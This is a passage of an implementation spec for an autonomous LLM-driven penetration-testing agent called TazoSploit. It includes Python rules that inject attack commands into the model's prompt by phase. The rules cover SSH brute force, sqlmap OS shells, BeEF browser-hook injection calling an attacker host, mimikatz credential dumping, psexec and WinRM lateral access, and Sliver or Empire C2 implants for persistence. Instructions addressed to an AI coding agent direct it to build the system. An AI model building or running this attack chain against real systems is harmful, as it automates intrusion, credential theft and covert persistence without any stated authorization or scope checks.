    phase: str                               # RECON, VULN_DISCOVERY, EXPLOITATION, POST_EXPLOIT
    target_os: TargetOS = TargetOS.UNKNOWN
    services_found: List[ServiceType] = field(default_factory=list)
    vulns_found: List[Dict] = field(default_factory=list)   # [{type: VulnType, detail: str, service: str}]
    tools_used: Dict[str, int] = field(default_factory=dict) # {tool_name: times_used}
    tools_failed: List[str] = field(default_factory=list)    # tools that errored/returned nothing
    has_shell: bool = False                   # agent has active shell/session
    has_creds: bool = False                   # agent found valid credentials
    has_c2: bool = False                      # C2 implant active
    iteration: int = 0
    target_ip: str = ""
    target_url: str = ""


@dataclass
class ToolRecommendation:
    """A single tool recommendation with context."""
    tool: str                    # tool/command name
    reason: str                  # why this tool right now
    command_hint: str            # example command to get started
    priority: int                # 1 = highest priority
    category: str                # recon, scanning, exploitation, c2, post_exploit


# ============================================================
# RECOMMENDATION RULES
# Each rule: (condition_fn, recommendations)
# Rules are evaluated in order. First matching rules contribute.
# Final output is deduplicated, ranked, and limited to top 5.
# ============================================================

RECOMMENDATION_RULES = [

    # === RECON PHASE RULES ===
    {
        "name": "initial_recon_no_services",
        "phase": "RECON",
        "condition": lambda ctx: len(ctx.services_found) == 0,
        "tools": [
            ToolRecommendation("nmap", "No services discovered yet. Start with comprehensive port scan.",
                               "nmap -sV -sC -O -p- {TARGET_IP}", 1, "recon"),
            ToolRecommendation("rustscan", "Fast port discovery, then hand off to nmap for details.",
                               "rustscan -a {TARGET_IP} --ulimit 5000 -- -sV -sC", 2, "recon"),
        ]
    },
    {
        "name": "recon_http_found",
        "phase": "RECON",
        "condition": lambda ctx: ServiceType.HTTP in ctx.services_found or ServiceType.HTTPS in ctx.services_found,
        "tools": [
            ToolRecommendation("zap", "HTTP service found. Run ZAP spider + active scan for comprehensive web vuln discovery.",
                               "curl 'http://zap:8090/JSON/spider/action/scan?url={TARGET_URL}'", 1, "scanning"),
            ToolRecommendation("ffuf", "Directory/file bruteforce on web service.",
                               "ffuf -u {TARGET_URL}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403", 2, "recon"),
            ToolRecommendation("whatweb", "Fingerprint web technology stack.",
                               "whatweb -v {TARGET_URL}", 3, "recon"),
        ]
    },
    {
        "name": "recon_smb_found",
        "phase": "RECON",
        "condition": lambda ctx: ServiceType.SMB in ctx.services_found,
        "tools": [
            ToolRecommendation("enum4linux", "SMB service found. Enumerate shares, users, groups.",
                               "enum4linux -a {TARGET_IP}", 1, "recon"),
            ToolRecommendation("crackmapexec", "SMB enumeration and spray.",
                               "crackmapexec smb {TARGET_IP} --shares", 2, "recon"),
            ToolRecommendation("smbclient", "Manual SMB share exploration.",
                               "smbclient -L //{TARGET_IP}/ -N", 3, "recon"),
        ]
    },
    {
        "name": "recon_ssh_found",
        "phase": "RECON",
        "condition": lambda ctx: ServiceType.SSH in ctx.services_found,
        "tools": [
            ToolRecommendation("hydra", "SSH found. Try credential brute force.",
                               "hydra -L /usr/share/wordlists/common-users.txt -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP}", 1, "exploitation"),
        ]
    },

    # === VULN DISCOVERY RULES ===
    {
        "name": "vuln_web_deep_scan",
        "phase": "VULN_DISCOVERY",
        "condition": lambda ctx: ServiceType.HTTP in ctx.services_found or ServiceType.HTTPS in ctx.services_found,
        "tools": [
            ToolRecommendation("nuclei", "Run nuclei templates for known CVEs and misconfigs.",
                               "nuclei -u {TARGET_URL} -severity critical,high,medium -o /tmp/nuclei_results.txt", 1, "scanning"),
            ToolRecommendation("zap", "ZAP active scan for deep web vulnerability discovery.",
                               "curl 'http://zap:8090/JSON/ascan/action/scan?url={TARGET_URL}&recurse=true'", 2, "scanning"),
            ToolRecommendation("sqlmap", "Test form parameters for SQL injection.",
                               "sqlmap -u '{TARGET_URL}?id=1' --batch --level=3 --risk=2", 3, "exploitation"),
        ]
    },
    {
        "name": "vuln_windows_target",
        "phase": "VULN_DISCOVERY",
        "condition": lambda ctx: ctx.target_os == TargetOS.WINDOWS,
        "tools": [
            ToolRecommendation("crackmapexec", "Windows target. Check for common vulns (EternalBlue, Zerologon, PetitPotam).",
                               "crackmapexec smb {TARGET_IP} -M zerologon -M petitpotam", 1, "scanning"),
            ToolRecommendation("nmap", "Run Windows-specific NSE scripts.",
                               "nmap --script 'smb-vuln-*' -p 445 {TARGET_IP}", 2, "scanning"),
        ]
    },

    # === EXPLOITATION RULES ===
    {
        "name": "exploit_xss_found",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: any(v.get('type') == VulnType.XSS for v in ctx.vulns_found),
        "tools": [
            ToolRecommendation("beef", "XSS confirmed! Inject BeEF hook for browser takeover.",
                               "# Inject: <script src='http://{LHOST}:3000/hook.js'></script>\ncurl -X POST http://beef:3000/api/admin/login -d '{\"username\":\"beef\",\"password\":\"beef123\"}'", 1, "exploitation"),
        ]
    },
    {
        "name": "exploit_sqli_found",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: any(v.get('type') == VulnType.SQLI for v in ctx.vulns_found),
        "tools": [
            ToolRecommendation("sqlmap", "SQLi confirmed! Exploit for data extraction, OS shell, or file read.",
                               "sqlmap -u '{TARGET_URL}' --batch --os-shell --level=5 --risk=3", 1, "exploitation"),
        ]
    },
    {
        "name": "exploit_rce_found",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: any(v.get('type') == VulnType.RCE for v in ctx.vulns_found),
        "tools": [
            ToolRecommendation("msfconsole", "RCE confirmed! Use Metasploit to get a proper shell/meterpreter.",
                               "msfconsole -q -x 'search {CVE}; use 0; set RHOSTS {TARGET_IP}; set LHOST {LHOST}; exploit'", 1, "exploitation"),
            ToolRecommendation("empire", "Deploy Empire agent for persistent C2 after RCE.",
                               "curl -X POST http://empire:1337/api/v2/listeners -d '{\"name\":\"http\",\"template\":\"http\"}'", 2, "c2"),
        ]
    },
    {
        "name": "exploit_weak_creds_windows",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: ctx.has_creds and ctx.target_os == TargetOS.WINDOWS,
        "tools": [
            ToolRecommendation("evil-winrm", "Creds found + Windows. Get interactive shell via WinRM.",
                               "evil-winrm -i {TARGET_IP} -u {USER} -p {PASS}", 1, "exploitation"),
            ToolRecommendation("impacket-psexec", "Creds found + Windows. PsExec for SYSTEM shell.",
                               "impacket-psexec {DOMAIN}/{USER}:{PASS}@{TARGET_IP}", 2, "exploitation"),
            ToolRecommendation("crackmapexec", "Validate creds across multiple services.",
                               "crackmapexec smb {TARGET_IP} -u {USER} -p {PASS} --shares --sessions", 3, "exploitation"),
        ]
    },
    {
        "name": "exploit_weak_creds_linux",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: ctx.has_creds and ctx.target_os == TargetOS.LINUX,
        "tools": [
            ToolRecommendation("ssh", "Creds found + Linux. SSH directly.",
                               "ssh {USER}@{TARGET_IP}", 1, "exploitation"),
        ]
    },
    {
        "name": "exploit_no_vulns_try_brute",
        "phase": "EXPLOITATION",
        "condition": lambda ctx: len(ctx.vulns_found) == 0 and not ctx.has_creds,
        "tools": [
            ToolRecommendation("hydra", "No vulns found yet. Try credential brute force on discovered services.",
                               "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {SERVICE}://{TARGET_IP}", 1, "exploitation"),
            ToolRecommendation("searchsploit", "Search for known exploits for discovered service versions.",
                               "searchsploit {SERVICE} {VERSION}", 2, "exploitation"),
        ]
    },

    # === POST-EXPLOIT RULES ===
    {
        "name": "post_exploit_windows_shell",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_shell and ctx.target_os == TargetOS.WINDOWS,
        "tools": [
            ToolRecommendation("empire", "Windows shell active. Deploy Empire for persistence + lateral movement.",
                               "curl -X POST http://empire:1337/api/v2/stagers -d '{\"template\":\"windows/launcher_bat\",\"options\":{\"Listener\":\"http_listener\"}}'", 1, "c2"),
            ToolRecommendation("mimikatz", "Dump credentials from Windows memory.",
                               "mimikatz 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'", 2, "post_exploit"),
            ToolRecommendation("winpeas", "Automated Windows privilege escalation enumeration.",
                               "winpeas.exe", 3, "post_exploit"),
            ToolRecommendation("bloodhound", "Map Active Directory attack paths.",
                               "sharphound.exe -c All", 4, "post_exploit"),
        ]
    },
    {
        "name": "post_exploit_linux_shell",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_shell and ctx.target_os == TargetOS.LINUX,
        "tools": [
            ToolRecommendation("linpeas", "Automated Linux privilege escalation enumeration.",
                               "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", 1, "post_exploit"),
            ToolRecommendation("sliver", "Deploy Sliver implant for stealthy persistent C2.",
                               "sliver-client generate --mtls {LHOST} --os linux --save /tmp/implant", 2, "c2"),
        ]
    },
    {
        "name": "post_exploit_need_stealth_c2",
        "phase": "POST_EXPLOIT",
        "condition": lambda ctx: ctx.has_shell and not ctx.has_c2,
        "tools": [
            ToolRecommendation("sliver", "Need persistent C2. Sliver uses mTLS/WireGuard (stealthier than Empire HTTP).",
                               "sliver-client generate --mtls {LHOST} --os {OS} --save /tmp/implant", 1, "c2"),
            ToolRecommendation("empire", "Need persistent C2. Empire for PowerShell-based ops (more modules than Sliver).",
                               "curl -X POST http://empire:1337/api/v2/listeners -d '{...}'", 2, "c2"),
        ]
    },
]


def get_recommendations(context: AgentContext, max_results: int = 5) -> List[ToolRecommendation]:
    """
    Get tool recommendations based on current agent context.

    Evaluates all rules matching the current phase and context,
    deduplicates by tool name (keep highest priority), and returns
    top N recommendations.
    """
    candidates: List[ToolRecommendation] = []

    for rule in RECOMMENDATION_RULES:
        # Phase must match (or rule has no phase = applies to all)
        if rule.get("phase") and rule["phase"] != context.phase:
            continue

        # Evaluate condition
        try:
            if rule["condition"](context):
                candidates.extend(rule["tools"])
                logger.debug(f"Rule '{rule['name']}' matched, added {len(rule['tools'])} recommendations")
        except Exception as e:
            logger.warning(f"Rule '{rule['name']}' evaluation failed: {e}")

    # Deduplicate by tool name (keep highest priority = lowest number)
    seen: Dict[str, ToolRecommendation] = {}
    for rec in candidates:
        if rec.tool not in seen or rec.priority < seen[rec.tool].priority:
            seen[rec.tool] = rec

    # Filter out tools that have failed in this session
    filtered = [r for r in seen.values() if r.tool not in context.tools_failed]

    # Sort by priority
    filtered.sort(key=lambda r: r.priority)

    # Comfort zone breaker: if a tool has been used 5+ times, demote it
    for rec in filtered:
        if context.tools_used.get(rec.tool, 0) >= 5:
            rec.priority += 10  # Push to bottom
            rec.reason = f"[OVERUSED — {context.tools_used[rec.tool]}x] " + rec.reason

    # Re-sort after demotion
    filtered.sort(key=lambda r: r.priority)

    return filtered[:max_results]


def format_recommendations_for_prompt(recs: List[ToolRecommendation]) -> str:
    """
    Format recommendations for injection into LLM prompt.
    Uses TOON format for token efficiency.
    """
    from toon_format import to_toon

    prompt_data = []
    for i, rec in enumerate(recs, 1):
        prompt_data.append({
            "rank": i,
            "tool": rec.tool,
            "why": rec.reason,
            "example": rec.command_hint,
            "category": rec.category,
        })

    header = (
        f"[RECOMMENDED TOOLS — {len(recs)} options for current situation]\n"
        "Pick ONE of these tools for your next action. They are ranked by relevance.\n"
        "Do NOT use tools outside this list unless you have a specific reason.\n\n"
    )
    return header + to_toon(prompt_data)


def build_context_from_agent(agent) -> AgentContext:
    """
    Build AgentContext from the running DynamicAgent instance.
    Parses agent state to extract OS, services, vulns, etc.
    """
    context = AgentContext(
        phase=getattr(agent, 'phase_current', 'RECON'),
        target_ip=getattr(agent, 'target', ''),
        target_url=getattr(agent, 'target_url', ''),
        iteration=getattr(agent, 'iteration', 0),
    )

    # Detect target OS from nmap results, banner grabs, etc.
    if hasattr(agent, '_detected_os'):
        os_str = agent._detected_os.lower()
        if 'windows' in os_str:
            context.target_os = TargetOS.WINDOWS
        elif 'linux' in os_str or 'ubuntu' in os_str or 'debian' in os_str:
            context.target_os = TargetOS.LINUX
        elif 'macos' in os_str or 'darwin' in os_str:
            context.target_os = TargetOS.MACOS

    # Extract discovered services from vuln tracker / scan results
    if hasattr(agent, 'vuln_tracker') and agent.vuln_tracker:
        for finding in agent.vuln_tracker.get('findings', []):
            # Map finding types to VulnType
            ftype = finding.get('type', '').lower()
            vuln_map = {
                'xss': VulnType.XSS, 'sqli': VulnType.SQLI, 'sql injection': VulnType.SQLI,
                'rce': VulnType.RCE, 'command injection': VulnType.RCE,
                'lfi': VulnType.LFI, 'rfi': VulnType.RFI, 'ssrf': VulnType.SSRF,
                'idor': VulnType.IDOR, 'auth bypass': VulnType.AUTH_BYPASS,
            }
            for key, vtype in vuln_map.items():
                if key in ftype:
                    context.vulns_found.append({'type': vtype, 'detail': finding.get('title', '')})
                    break

    # Check for active sessions/shells
    context.has_shell = getattr(agent, '_has_active_session', lambda: False)()
    context.has_creds = getattr(agent, '_found_credentials', False)
    context.has_c2 = getattr(agent, '_c2_active', False)

    # Tool usage from tracker
    if hasattr(agent, 'tool_usage_tracker'):
        context.tools_used = dict(agent.tool_usage_tracker)

    return context
```

**Integration in `dynamic_agent.py`:**

```python
# In the main agent loop, BEFORE building the LLM prompt:

from tool_recommender import get_recommendations, format_recommendations_for_prompt, build_context_from_agent

# Build context from current agent state
rec_context = build_context_from_agent(self)

# Get ranked recommendations (top 5)
recommendations = get_recommendations(rec_context, max_results=5)

# Inject into LLM prompt (replaces dumping all 133 skills)
if recommendations:
    tool_prompt = format_recommendations_for_prompt(recommendations)
    # Replace the full skill catalog injection with focused recommendations
    self.conversation.append({
        "role": "system",
        "content": tool_prompt
    })
```

**How the 3-Layer Funnel Works Together:**

```
Iteration 47 — Phase: EXPLOITATION — Target: Windows 11 — XSS + SQLi found

Layer 1 (Phase Gate):
  133 tools → 45 allowed in EXPLOITATION phase
  Blocked: nmap, masscan, whatweb, subfinder... (recon-only)

Layer 2 (Context Recommender):
  Input: Windows OS, HTTP service, XSS confirmed, SQLi confirmed, has no shell
  Rules matched:
    - exploit_xss_found → BeEF (priority 1)
    - exploit_sqli_found → sqlmap --os-shell (priority 1)
    - exploit_weak_creds_windows → [skipped, no creds]
  Output: [BeEF, sqlmap, msfconsole, empire, searchsploit]

Layer 3 (Comfort Zone Breaker):
  Agent used sqlmap 6 times already → demoted
  Agent never used BeEF → stays at priority 1

Final prompt injection:
  "RECOMMENDED TOOLS — 5 options:
   1. beef — XSS confirmed! Inject BeEF hook for browser takeover
   2. msfconsole — RCE potential via SQLi --os-shell, get meterpreter
   3. empire — Deploy C2 agent after getting shell
   4. searchsploit — Check for CVEs on IIS 10.0
   5. sqlmap — [OVERUSED 6x] Try --os-shell for system access"
```

### 9.7 Tool Phase Map Updates

Add to `DEFAULT_TOOL_PHASE_MAP` in `tool_phase_map.py`:

```python
# Empire C2 (post-exploitation only)
'powershell-empire': ['EXPLOITATION', 'POST_EXPLOIT'],
'empire': ['EXPLOITATION', 'POST_EXPLOIT'],
'starkiller': ['EXPLOITATION', 'POST_EXPLOIT'],

# OWASP ZAP (web scanning — recon through exploitation)
'zap': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION'],
'zaproxy': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION'],

# BeEF (browser exploitation — exploitation + post-exploit)
'beef': ['EXPLOITATION', 'POST_EXPLOIT'],
'beef-xss': ['EXPLOITATION', 'POST_EXPLOIT'],

# Sliver C2 (post-exploitation only)
'sliver': ['EXPLOITATION', 'POST_EXPLOIT'],
'sliver-client': ['EXPLOITATION', 'POST_EXPLOIT'],
```

### 9.7 Docker Compose Summary

After these additions, docker-compose.yml will have:

| Container | Purpose | Ports | Network |
|-----------|---------|-------|---------|
| `tazosploit-empire` | Empire C2 server + REST API | 1337 (API), 5000 (Starkiller UI) | exec-net |
| `tazosploit-zap` | OWASP ZAP headless scanner + REST API | 8090 (API) | exec-net |
| `tazosploit-beef` | BeEF browser exploitation + REST API | 3000 (UI+hook.js), 6789 (WebSocket) | exec-net |
| `tazosploit-sliver` | Sliver C2 framework + gRPC API | 31337 (gRPC), 8888 (HTTP C2), 443 (HTTPS C2) | exec-net |
| `neo4j` (Sprint 2) | Knowledge graph | 7474 (browser), 7687 (bolt) | exec-net, control-net |

### 9.8 Kali Dockerfile Updates

```dockerfile
# Add to kali-executor Dockerfile (packages available in Kali repos)
RUN apt-get update && apt-get install -y \
    powershell-empire \
    zaproxy \
    python3-zapv2 \
    beef-xss \
    sliver
```

### 9.9 New Files to Create (add to Appendix)

| # | Path | Purpose | Sprint |
|---|------|---------|--------|
| 21 | `skills/empire_c2.yaml` | Empire C2 skill file | 1 |
| 22 | `skills/owasp_zap.yaml` | OWASP ZAP skill file | 1 |
| 23 | `skills/beef_browser.yaml` | BeEF browser exploitation skill | 1 |
| 24 | `skills/sliver_c2.yaml` | Sliver C2 skill file | 1 |
| 25 | `kali-executor/open-interpreter/tool_recommender.py` | Context-aware tool selection (3-layer funnel) | 1 |

---

## Implementation Notes for the AI Agent

1. **Always test after each change.** Run the existing test suite and do a manual pentest run against DVWA or JuiceShop.

2. **Don't break existing functionality.** The new phase system should be backward-compatible. If `PhaseState` is not initialized, fall back to existing behavior.

3. **Neo4j is optional.** If the Neo4j container is not running, `KnowledgeGraph.available` returns `False` and all write/read operations are no-ops. The agent should work fine without it.

4. **Structured output is opt-in.** Set `USE_STRUCTURED_OUTPUT=true` to enable. When disabled, the existing regex-based command extraction continues to work.

5. **The tool phase map allows unknown tools.** If a tool is not in `DEFAULT_TOOL_PHASE_MAP`, it's allowed in all phases. This means custom scripts, python exploits, and anything not explicitly mapped will still work.

6. **Redis is the source of truth for settings.** The API writes to Redis, the agent reads from Redis. Settings are loaded once at job start and can be reloaded via `reload_settings()`.

7. **Preserve TazoSploit's strengths.** The 125+ skill arsenal, evidence detection patterns (12+ regex), exploit chain memory, and CVE lookup are unique advantages over RedAmon. Do NOT remove or weaken these. The upgrades should make the agent USE these tools more effectively, not replace them.

8. **The `dynamic_agent.py` file is ~9500 lines.** When making changes, use precise line references and surgical edits. Do not rewrite large sections unnecessarily. Each change should be an isolated, testable modification.

9. **Docker networking:** Neo4j needs to be on both `exec-net` (for kali-executor access) and `control-net` (for API access). The kali-executor container needs `NEO4J_URI=bolt://neo4j:7687` in its environment.

10. **Python dependencies:** New packages needed in the kali-executor Dockerfile:
    - `neo4j` (Neo4j Python driver)
    - `pydantic>=2.0` (for structured output models)
    - `toon_format>=0.9.0b1` (already installed — TOON serialization for LLM context)
    - These should be added to `kali-executor/open-interpreter/requirements.txt` or equivalent

11. **Interactive chat is Sprint 0.** The event emitter, guidance queue, and chat WebSocket are the foundation for ALL other features (approval gates need WebSocket, phase updates need event emitter, etc.). Build these first.

12. **Guidance queue uses Redis lists, not pubsub.** This is intentional — lists persist if the agent is slow to drain, while pubsub messages are lost if nobody is listening. The event emitter uses pubsub for real-time streaming (lossy is OK for display events).

13. **Stop/resume uses Redis keys, not LangGraph.** TazoSploit doesn't use LangGraph, so checkpointing is done by serializing key state fields to Redis with a 24h TTL. This is simpler but means resume must be done within 24 hours.

14. **TOON, not JSON for LLM context (MANDATORY).** Every piece of data injected into the LLM prompt must use `toon_format.to_toon()`, not `json.dumps()`. This includes: vuln tracker data, execution traces, skill catalogs, knowledge graph summaries, structured context. Redis/API/frontend internal data can stay JSON. The rule: if an LLM reads it → TOON. If a machine reads it → JSON is fine.

15. **RedAmon is your reference architecture.** It should be mounted alongside TazoSploit in Windsurf. Before implementing any feature, read the equivalent RedAmon file first. Adapt the PATTERN, not the code — RedAmon uses LangGraph/MCP which we don't. Our agent is a direct Python loop with Kali CLI access, which is simpler and more powerful for pentesting.

16. **Use Spec Kit for sprint planning.** Initialize Spec Kit in TazoSploit (`specify init . --ai claude`), create a constitution, then use `/speckit.specify` and `/speckit.plan` for each sprint. This generates testable, dependency-ordered task lists instead of ad-hoc implementation.

17. **Neo4j MCP server available.** Docker Desktop has `mcp/neo4j-data-modeling` (16 tools) for schema design and validation. Use it during Sprint 2 to design the graph schema before writing `knowledge_graph.py`.

18. **Tool Recommender replaces full skill catalog in prompts (CRITICAL).** Never inject all 133 tools into the LLM prompt. Instead, use `tool_recommender.py` to analyze current context (phase, target OS, services, vulns, usage history) and inject only the top 3-5 ranked recommendations. This is the single most important change for fixing the "agent uses 8 of 133 tools" problem. The full skill catalog is still available as a fallback lookup, but the LLM only sees curated picks.

---

*End of implementation instructions. This document is self-contained — an AI agent with access to both TazoSploit and RedAmon repos should be able to implement all changes without external documentation. All LLM-facing serialization uses TOON format.*